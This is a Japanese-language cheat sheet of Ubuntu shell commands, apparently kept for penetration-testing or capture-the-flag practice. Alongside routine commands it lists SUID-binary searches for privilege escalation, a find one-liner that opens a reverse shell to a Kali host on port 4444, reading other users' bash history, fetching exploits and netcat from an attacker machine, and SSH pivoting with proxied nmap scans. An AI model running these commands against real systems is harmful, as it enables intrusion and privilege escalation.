# ubuntu bash

* ファイル指定

``` shell
  # 便利
  # $(which XXX)
  cp $(which find) /tmp/find
```

* パスワード変更

    ```shell
      passwd [USER_NAME]
    ```

* ユーザ情報

  ``` shell
    id
  ```

* sudo
  
    ``` shell
      #sudoの情報表示
      sudo -l
    ```

* find

``` shell
  #sudo設定のファイルを検索
  find / -perm -4000
  #または
  find / -type f -perm -4000 -ls 2>/dev/null
  #コマンド実行
  find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
```

* cat

``` shell
  #過去の入力情報の表示
  cat /home/XXX/.bash_history
```

* grep
  
    ```shell
      #階層検索
      grep -r
      #よく使う
      ls -l | grep -re XXXX -re YYY
      # 該当するファイル名表示
      grep -l
      # nseスクリプトで脆弱性検索
      grep <app_name> -rl /usr/share/nmap/scripts/ 
    ```

* egrep

    ``` shell
      # 実行されているOSバージョンを表示
      ls /etc | egrep -e "fedore*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release"
    ```

* wget
  * ダウンロード

  ``` shell
    # ダウンロード
    wget https://www.exploit-db.com/download/XXXXXX -O filename
  ```
  
  * 自前のwebサーバーからファイルをダウンロードさせる。

  ``` shell
      # Web server
      python -m http.server 8000
      # 転送
      # wget -O [転送先] [転送するファイル]
      wget -O /tmp/XXX http://XXX.XXX.XXX.XXX:8000/filename
  ```

* curl

  ``` shell
      #curlでファイル転送
      curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
  ```

* pythonの仮想環境
  
  ``` bash
      #仮想環境の作成
      python3 -m venv myenv
      #仮想環境の有効か
      source myenv/bin/activate
      #仮想環境内でパッケージインストール
      pip install <package_name>
      #作業後仮想環境を無効化
      deactivate
  ```

* マウントされているボリュームの取得
  
  ``` shell
    mount
  ```

* xfreerdp

  ``` shell
      xfreerdp /u:win /p:password /v:127.0.0.1
  ```

* ssh

  ``` shell
    ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null

    # port forwarding
    ssh -N -L <localport>:<remoteXXX.XXX.XXX.XXX>:<remote_port> <踏み台user>@<踏み台XXX.XXX.XXX.XXX.>
    
    # dynamic port forwarding
    ssh -fND 127.0.0.1:8080
    #proxy経由でターゲットへのnmapスキャン
    proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
  ```

* cron

  ``` shell
      # 設定確認
      cat /etc/crontab
      #　登録
      crontab -u <ユーザ名> -e    
  ```

* sftp
  
  ``` shell
      # sftp -i <秘密鍵> -P 8080 <ユーザ>@localhost
      sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
      #接続後 ファイルを自分の端末に転送
      get /C:/Users/testuser/Desktop/Pentest/flag.txt
  ```
